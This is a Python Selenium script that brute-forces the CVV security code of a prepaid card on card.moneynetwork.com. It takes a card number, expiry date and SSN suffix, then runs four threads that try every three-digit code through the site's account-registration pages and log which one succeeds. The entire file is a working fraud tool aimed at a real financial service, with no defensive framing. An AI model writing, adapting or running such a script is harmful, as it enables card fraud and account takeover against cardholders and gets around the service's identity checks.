from selenium import webdriver
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
import threading


def wait(driver, url, element):
    driver.get(url)

    try:
        element_presence = EC.presence_of_element_located((By.XPATH, element))
        WebDriverWait(driver, 5).until(element_presence)
    except:
        return False
    return True


def write_row(logFile, data):
    for item in data:
        logFile.write("\"" + item + "\"" + ",")
    logFile.write("\n")


class cvvThread(threading.Thread):
    def __init__(self, cardnumber, expYear, expMonth, ssn, start, end, stop_event):
        threading.Thread.__init__(self)
        self.cardnumber = cardnumber
        self.expYear = expYear
        self.expMonth = expMonth
        self.ssn = ssn
        self.begin = start
        self.end = end

        self._stop_event = stop_event

    def stop(self):
        self._stop_event.set()

    def run(self):

        logFile = open("card_log_"+str(self.begin) +
                       "_"+str(self.end)+".csv", "w")
        columns = ["CVV", "Urls", "Result"]
        write_row(logFile, columns)

        driver = webdriver.Chrome()
        for cvv in range(self.begin, self.end):
            if self._stop_event.is_set():
                logFile.close()
                break
            url = "https://card.moneynetwork.com"
            if wait(driver, "https://card.moneynetwork.com", "//*[@id=\"sidebar-wrapper\"]/ul/li[2]/a") == True:
                write_row(logFile, [format(cvv, "03d"), url, "Success"])
                url = "https://card.moneynetwork.com/govt/registerUserAccount.gft?reqType=init&token=null"
                if wait(driver, url, "//*[@id=\"cardNumber\"]") == True:
                    write_row(logFile, [
                              "", "https://card.moneynetwork.com/govt/registerUserAccount.gft?reqType=init&token=null", "Success"])
                    url = "https://card.moneynetwork.com/govt/registerUserAccount.gft?=org.apache.struts.taglib.html.TOKEN=0&reqType=regUser_AccountValidation&giftCardNumber=" + \
                        self.cardnumber + "&giftCardExpMonth=" + \
                        self.expMonth + "&giftCardExpYear=" + self.expYear
                    if wait(driver, url, "//*[@id=\"securitycode\"]") == True:
                        write_row(logFile, ["", url, "Success"])
                        url = "https://card.moneynetwork.com/govt/registerUserAccount.gft?=org.apache.struts.taglib.html.TOKEN=0&reqType=regUser_AccountValidation_Addnl_Params&cvv=" + \
                            format(cvv, "03d") + "&ssnSuf=" + \
                            format(self.ssn, "04d")
                        if wait(driver, url, "//*[@id=\"errMsg\"]/li") == True:
                            write_row(logFile, ["", url, "Incorrect CVV"])
                            continue
                        else:
                            write_row(logFile, ["", url, "correct CVV"])
                            print("Correct CVV is : ", cvv)
                            self.stop()
        logFile.close()


if __name__ == "__main__":
    iCardnumber = iExpMonth = iExpYear = iSsn = ""
    while True:
        print("Input Card Number:")
        iCardnumber = input()

        print("Input Expiration Year(2026):")
        iExpYear = input()

        print("Input Expiration Month(08):")
        iExpMonth = input()

        print("Input SSN(Social Security Number):")
        iSsn = int(input())

        print("Please confirm if all information is correct.")
        print("Shall we go next step?(y/n)")
        if input() == "y":
            break
    stopEvent = threading.Event()
    cvvFinders = [cvvThread(iCardnumber, iExpYear, iExpMonth, iSsn,
                            begin, begin+250, stopEvent) for begin in [0, 250, 500, 750]]
    for finder in cvvFinders:
        finder.start()
    for finder in cvvFinders:
        finder.join()
    input()
